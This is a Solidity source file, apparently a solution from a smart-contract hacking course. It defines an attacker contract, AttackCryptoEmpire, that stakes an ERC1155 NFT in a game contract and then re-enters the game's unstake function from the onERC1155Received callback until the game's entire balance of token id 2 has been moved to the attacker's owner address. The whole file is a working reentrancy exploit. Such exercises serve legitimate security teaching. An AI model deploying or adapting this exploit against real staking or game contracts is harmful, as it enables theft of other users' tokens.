// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policyGPL-3.0-or-later
pragma solidity ^0.8.13;

import { IERC1155 } from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface ICryptoEmpire {
    function stake(uint256 _nftId) external;
    function unstake(uint256 _nftId) external;
}

contract AttackCryptoEmpire is Ownable {

    IERC1155 private immutable token;
    ICryptoEmpire private immutable game;
    bool private tokenTransfered = false;

    constructor(address _token, address _game) {
        token = IERC1155(_token);
        game = ICryptoEmpire(_game);
    }

    function attack() external onlyOwner {
        // Stake the token
        token.setApprovalForAll(address(game), true);
        game.stake(2);
        // Unstake
        game.unstake(2);
    }

    // Receive a callback
    // Unstake again until we got all tokens (tokenId 2)
    function onERC1155Received(address operator, address from, uint256 id, uint256 amount, bytes calldata data)
    external returns (bytes4 response) {

        if(!tokenTransfered) {
            tokenTransfered = true;
            return this.onERC1155Received.selector;
        }

        require(msg.sender == address(token), "wrong call");
        
        uint256 gameBalance = token.balanceOf(address(game), 2);

        token.safeTransferFrom(address(this), owner(), id, 1, "");
        
        if(gameBalance > 0) {
            game.unstake(2);
        }

        return this.onERC1155Received.selector;
    }
}